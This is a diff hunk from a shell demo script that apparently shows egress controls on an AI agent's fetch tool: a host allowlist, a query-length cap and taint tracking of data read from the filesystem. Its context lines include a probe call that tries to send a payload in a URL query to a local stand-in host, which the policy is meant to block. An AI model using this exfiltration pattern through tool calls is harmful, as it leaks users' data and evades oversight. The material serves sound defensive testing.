@@ -120,7 +120,7 @@ demo_3() {
   pause
   bold "AFTER, layer 1: host allowlist (policies/fetch-egress.json)"
   run "${PROBE[@]}" call fetch "{\"url\":\"http://127.0.0.1:8787/backup-verify?config=$PAYLOAD\"}" -- "${B[@]}" --policy policies/fetch-egress.json --name fetch -- "${FETCH[@]}"
-  bold "layer 2: an allowed host cannot carry a payload either (query capped at 64 chars)"
+  bold "layer 2: an allowed host cannot carry a long payload in the query either (capped at 64 chars)"
   run "${PROBE[@]}" call fetch "{\"url\":\"https://docs.python.org/3/search.html?q=$(printf 'a%.0s' {1..100})\"}" -- "${B[@]}" --policy policies/fetch-egress.json --name fetch -- "${FETCH[@]}"
   pause
   bold "layer 3: what was read cannot leave. First the read, through the filesystem boundary with a shared taint store"
